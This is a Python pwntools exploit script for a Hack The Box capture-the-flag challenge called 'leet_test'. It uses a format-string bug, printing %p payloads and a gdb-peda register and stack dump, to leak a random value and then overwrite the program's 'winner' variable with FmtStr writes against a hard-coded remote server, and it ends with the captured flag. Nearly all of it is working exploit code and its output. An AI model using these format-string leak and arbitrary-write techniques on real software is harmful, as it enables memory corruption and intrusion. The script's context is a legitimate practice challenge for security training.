#Format String
#https://www.youtube.com/watch?v=NOY_dc2fRbU
'''
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)

'''

from pwn import *

context.arch = 'amd64'
context.log_level = 'debug'

def detect(io):
        io.sendline('%p.'*80)
        buf = io.recvuntil('Sorry! You aren\'t 1337 enough :(').split('\n')[1].split('.')
        for i in range(len(buf)):
                print str(i+1)+' : '+buf[i]

def send_payload(payload):
	io.sendline(payload)
	io.recvuntil('Hello, ')
	return io.recvline()

elf = ELF('./leet_test')

#io = process('./leet_test')
#io = gdb.debug('./leet_test', 'break main' )

ip, port = '167.99.195.233', 30023
io = remote(ip, port)

#detect(io)   #offset == 10
#refer to Format

'''
Please enter your name: %p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p
Hello, 0x7fffffffc000.(nil).0x7ffff7e9ca37.0x7.(nil).(nil).0x859d00000000.0x3.(nil).0x70252e70252e7025.0x252e70252e70252e.0x2e70252e70252e70.0x70252e70252e7025.0x252e70252e70252e.0x2e70252e70252e70.0x70252e70252e7025.0x252e70252e70252e.0x2e70252e70252e70.0x70252e70252e7025.0xa70252e.(nil).(nil).(nil).(nil).(nil).(nil).(nil).(nil)
[----------------------------------registers-----------------------------------]
RAX: 0x859d
RBX: 0x0
RCX: 0x7ffff7e9ca37 (<__GI___libc_write+23>:    cmp    rax,0xfffffffffffff000)
RDX: 0x0
RSI: 0x7fffffffc000 ("0x7fffffffc000.(nil).0x7ffff7e9ca37.0x7.(nil).(nil).0x859d00000000.0x3.(nil).0x70252e70252e7025.0x252e70252e70252e.0x2e70252e70252e70.0x70252e70252e7025.0x252e70252e70252e.0x2e70252e70252e70.0x70252e7"...)
RDI: 0x7fffffffbee0 --> 0x7ffff7dea0d0 (<__funlockfile>:        endbr64)
RBP: 0x7fffffffe260 --> 0x1
RSP: 0x7fffffffe120 --> 0x0
RIP: 0x4013a7 (<main+221>:      imul   edx,eax,0x1337c0de)
R8 : 0x145
R9 : 0x7fffffff
R10: 0x0
R11: 0x246
R12: 0x7fffffffe378 --> 0x7fffffffe5f9 ("/root/github/htb/ctf/pwn/LeetTest/leet_test")
R13: 0x4012ca (<main>:  endbr64)
R14: 0x0
R15: 0x7ffff7ffd040 --> 0x7ffff7ffe2e0 --> 0x0
EFLAGS: 0x206 (carry PARITY adjust zero sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x401397 <main+205>: mov    eax,0x0
   0x40139c <main+210>: call   0x4010e0 <printf@plt>
   0x4013a1 <main+215>: mov    eax,DWORD PTR [rbp-0x134]
=> 0x4013a7 <main+221>: imul   edx,eax,0x1337c0de
   0x4013ad <main+227>: mov    eax,DWORD PTR [rip+0x2cc5]        # 0x404078 <winner>
   0x4013b3 <main+233>: cmp    edx,eax
   0x4013b5 <main+235>: jne    0x4013be <main+244>
   0x4013b7 <main+237>: mov    eax,0x1
[------------------------------------stack-------------------------------------]
0000| 0x7fffffffe120 --> 0x0
0008| 0x7fffffffe128 --> 0x859d00000000
0016| 0x7fffffffe130 --> 0x3
0024| 0x7fffffffe138 --> 0x0
0032| 0x7fffffffe140 ("%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p\n")
0040| 0x7fffffffe148 (".%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p\n")
0048| 0x7fffffffe150 ("p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p\n")
0056| 0x7fffffffe158 ("%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p\n")
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value

Breakpoint 2, 0x00000000004013a7 in main ()
gdb-peda$ p $eax
$1 = 0x859d

'''

io.recvuntil('Please enter your name: ')
io.sendline('%7$p')
buf = io.recvline().strip().split(' ')[1]
#print buf
#print buf[-12:-8]
rand = int(buf[-12:-8], 16)

f = FmtStr(execute_fmt = send_payload, offset = 10)
#write to winner
f.write(0x404078, rand*0x1337c0de)
f.execute_writes()

io.interactive()
#Come right in! HTB{y0u_sur3_r_1337_en0ugh!!}
